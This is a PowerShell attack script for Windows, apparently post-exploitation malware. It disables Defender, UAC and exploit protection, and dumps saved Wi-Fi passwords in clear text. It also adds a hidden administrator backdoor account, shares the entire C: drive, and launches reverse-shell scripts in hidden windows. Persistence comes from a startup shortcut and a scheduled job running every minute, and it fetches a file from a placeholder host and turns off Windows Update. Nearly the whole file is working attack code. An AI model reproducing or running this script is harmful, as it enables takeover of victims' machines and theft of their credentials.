#Disables error reporting during script
$ErrorActionPreference= 'silentlycontinue'
#Sets script execution policty to remote signed
Set-ExecutionPolicy RemoteSigned -Force
#Creates Reg keys to disable Windows Defender Popups
New-Item -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender Security Center"
New-Item -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender Security Center\Notifications"
New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender Security Center\Notifications" -Name DisableEnhancedNotifications -Value 1 -PropertyType DWORD -Force
#Sets UAC Registy Value to 0 or off
Set-ItemProperty -Path REGISTRY::HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System -Name ConsentPromptBehaviorAdmin -Value 0 
#Disables Windows Defender Real Time Monitoring
Set-MpPreference -DisableRealtimeMonitoring $true
#Disables Exploit Protection Settings
Set-ProcessMitigation -PolicyFilePath "$env:USERPROFILE\AppData\Local\Temp\Winsettings.xml"
#Uninstalls Windows Defender, Will only work on older builds
Remove-WindowsFeature Windows-Defender, Windows-Defender-GUI
#Disables Windows Defender service, Will only work on older builds
Get-Service WinDefend | Stop-Service -PassThru | Set-Service -StartupType Disabled
#Creates a registry entry that disables Windows Defender, works on newer builds
New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name DisableAntiSpyware -Value 1 -PropertyType DWORD -Force
New-Item -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender Security Center\Real-Time Protection"
New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender Security Center\Real-Time Protection" -Name DisableBehaviorMonitoring -Value 1 -PropertyType DWORD -Force
New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender Security Center\Real-Time Protection" -Name DisableOnAccessProtection -Value 1 -PropertyType DWORD -Force
New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender Security Center\Real-Time Protection" -Name DisableScanOnRealtimeEnable -Value 1 -PropertyType DWORD -Force
New-Item -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection"
New-Item -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Remediation"
New-Item -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\UX Configuration"
New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" -Name DisableRealtimeMonitoring -Value 1 -PropertyType DWORD -Force
New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" -Name DisableBehaviorMonitoring -Value 1 -PropertyType DWORD -Force
New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" -Name DisableOnAccessProtection -Value 1 -PropertyType DWORD -Force
New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" -Name DisableScanOnRealtimeEnable -Value 1 -PropertyType DWORD -Force
New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Remediation" -Name LocalSettingOverrideScan_ScheduleTime -Value 1 -PropertyType DWORD -Force
New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Remediation" -Name Scan_ScheduleDay -Value 8 -PropertyType DWORD -Force
New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Remediation" -Name Scan_ScheduleTime -Value 3e7 -PropertyType DWORD -Force
New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\UX Configuration" -Name Notification_Suppress -Value 1 -PropertyType DWORD -Force
#Removes NT AUTHORITY\SYSTEM's control over Windows Defender's registry keys
$perfpath = "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender"
$system = "NT AUTHORITY\SYSTEM"
$DNSCacheBasePath='hklm:\system\currentcontrolset\services\dnscache'
$RpcEptMapperBasePath='hklm:\system\currentcontrolset\services\rpceptmapper'
$aclpaths=($DNSCacheBasePath,$RpcEptMapperBasePath)
$acl=Get-Acl $perfpath
 #disable permission inheritance and copy existing permissions to explicit permissions on parent Key
$acl.SetAccessRuleProtection($true,$true)
 #write the changes back to the reg key
$acl | Set-Acl -Path $perfpath
 #get the new (inheritance disabled) permission structure
$acl = get-acl $perfpath
 #remove any rule that applies to Users
$acl.PurgeAccessRules([System.Security.Principal.NTAccount]$system)
 #write the changes 
$acl | Set-Acl -Path $perfpath
 #fix Parent ACL
$acl = get-acl $aclpath
 #Enable Inheritance on the parent key
$acl.SetAccessRuleProtection($false,$true)
 #write the changes 
$acl | Set-Acl -Path $aclpath
#Collects and dumps Computer Name/IP information to sysdump.txt
(netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)}  | Select-String "Key Content\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass }} | Format-Table -AutoSize > c:\sysdump.txt
$command = {hostname; Get-NetIpaddress | Where PrefixOrigin -EQ DHCP}
$command.InvokeReturnAsIs() | Out-File c:\sysdump.txt -Append
#Creates User
NET USER Microsoft "l33t" /ADD
#Grants Admin to new user
NET LOCALGROUP Administrators Microsoft /ADD
#Sets prefered directory path
Set-MpPreference -ExclusionPath C:\Users
#Shares the C: drive for new user
New-SmbShare -Name "Microsoft" -Path "C:\" -FullAccess "Microsoft"
#Creates a folder
New-Item "C:\Windows\System32\GroupPolicy\Machine\Scripts\Startup" -itemtype "directory"
#Copys scripts into new folder
copy $env:USERPROFILE\AppData\Local\Temp\Invoke-ConPtyShell.ps1 C:\Windows\System32\GroupPolicy\Machine\Scripts\Startup\
copy $env:USERPROFILE\AppData\Local\Temp\RShell.ps1 C:\Windows\System32\GroupPolicy\Machine\Scripts\Startup\
copy $env:USERPROFILE\AppData\Local\Temp\Redux.ps1 C:\Windows\System32\GroupPolicy\Machine\Scripts\Startup\
#Runs scripts
Start-Process Powershell -window hidden C:\Windows\System32\GroupPolicy\Machine\Scripts\Startup\Invoke-ConPtyShell.ps1
Start-Process Powershell -window hidden C:\Windows\System32\GroupPolicy\Machine\Scripts\Startup\RShell.ps1
#Creates batch file to run at login
New-Item C:\Windows\System32\GroupPolicy\Machine\Scripts\Startup\Startup.cmd
$myvar = 
@"
Powershell -Command "& {Start-Process Powershell -ArgumentList '-Window Hidden -File C:\Windows\System32\GroupPolicy\Machine\Scripts\Startup\Redux.ps1' -Verb RunAs}"
"@
#$myvar1 = 
#@"
#Powershell -Command "& {Start-Process Powershell -ArgumentList '-Window Hidden -File C:\Windows\System32\GroupPolicy\Machine\Scripts\Startup\Invoke-ConPtyShell.ps1' -Verb RunAs}"
#"@
#$myvar2 = 
#@"
#Powershell -Command "& {Start-Process Powershell -ArgumentList '-Window Hidden -File C:\Windows\System32\GroupPolicy\Machine\Scripts\Startup\RShell.ps1' -Verb RunAs}"
#"@
#Set-Content C:\Windows\System32\GroupPolicy\Machine\Scripts\Startup\Startup.cmd $myvar1, $myvar2
Set-Content C:\Windows\System32\GroupPolicy\Machine\Scripts\Startup\Startup.cmd $myvar
#Creates shortcut in startup folder
$WshShell = New-Object -comObject WScript.Shell
$Shortcut = $WshShell.CreateShortcut("$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\Startup.lnk")
$Shortcut.TargetPath = "C:\Windows\System32\GroupPolicy\Machine\Scripts\Startup\Startup.cmd"
$Shortcut.WindowStyle = 7
$Shortcut.Save()
#Sets Windows Background
wget "http://{Insert Address Here}/268433.bak" -outfile "$env:USERPROFILE\AppData\Local\Temp\268433.jpg"; Set-ItemProperty -path 'HKCU:\Control Panel\Desktop\' -name wallpaper -value $env:USERPROFILE\AppData\Local\Temp\268433.jpg | rundll32.exe user32.dll, UpdatePerUserSystemParameters
#Adds Scheduled Task to run Redux.ps1 every 1mins
$jobname = "Recurring PowerShell Task"
$script =  "C:\Windows\System32\GroupPolicy\Machine\Scripts\Startup\Redux.ps1"
$repeat = (New-TimeSpan -Minutes 1)
$scriptblock = [scriptblock]::Create($script)
$trigger = New-JobTrigger -Once -At (Get-Date).Date -RepeatIndefinitely -RepetitionInterval $repeat
Register-ScheduledJob -Name $jobname -ScriptBlock $scriptblock -Trigger $trigger
#Disables Windows Update
sc.exe config wuauserv start=disabled | sc.exe stop wuauserv
